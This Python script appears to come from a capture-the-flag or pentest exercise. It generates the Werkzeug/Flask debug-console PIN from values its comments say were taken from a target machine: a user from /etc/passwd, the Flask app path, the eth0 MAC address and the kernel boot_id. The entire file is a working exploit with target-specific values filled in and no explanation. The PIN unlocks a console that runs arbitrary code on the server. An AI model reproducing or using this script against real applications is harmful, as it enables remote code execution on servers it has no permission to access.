import hashlib
from itertools import chain

#nonroot from /etc/passwd, '/usr/local/lib/python3.8/site-packages/flask/app.py' from just throwing an error page
probably_public_bits = ['nonroot', 'flask.app', 'Flask', '/usr/local/lib/python3.8/site-packages/flask/app.py']

#first from /sys/class/net/eth0/address (as decimal), second from /proc/sys/kernel/random/boot_id
private_bits = ['2485377892354', 'd1f2cb83-5d92-480d-849b-6215de57dfa0']

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = f"__wzd{h.hexdigest()[:20]}"

num = None
if num is None:
    h.update(b'pinsalt')
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)